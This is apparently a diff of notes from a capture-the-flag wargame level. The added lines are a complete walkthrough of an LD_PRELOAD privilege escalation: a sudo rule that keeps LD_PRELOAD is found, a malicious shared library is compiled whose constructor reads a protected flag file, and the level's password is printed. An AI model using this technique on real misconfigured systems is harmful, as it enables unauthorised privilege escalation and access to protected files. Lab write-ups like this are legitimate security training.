@@ -3,4 +3,11 @@
 
 goal: find password for phantom4
 
-sudo -u flagkeeper3 LD_PRELOAD=/tmp/ldcat.so /usr/bin/id: bl_phtm3_a76028a5c2716fec
+cat ~/BRIEFING: Inheritance
+sudo -l: env_keep+=LD_PRELOAD and (flagkeeper3) NOPASSWD: /usr/bin/id
+cat > /tmp/ldcat.c <<'EOF'\n#define _GNU_SOURCE\n#include <stdlib.h>\n__attribute__((constructor)) static void run(void){ system(\"/bin/cat /var/lib/phantom-flags/level3_flag > /tmp/p4pass 2>/tmp/p4err\"); }\nEOF
+gcc -shared -fPIC -o /tmp/ldcat.so /tmp/ldcat.c
+rm -f /tmp/p4pass
+sudo -u flagkeeper3 LD_PRELOAD=/tmp/ldcat.so /usr/bin/id >/dev/null 2>/dev/null
+
+cat /tmp/p4pass: bl_phtm3_a76028a5c2716fec
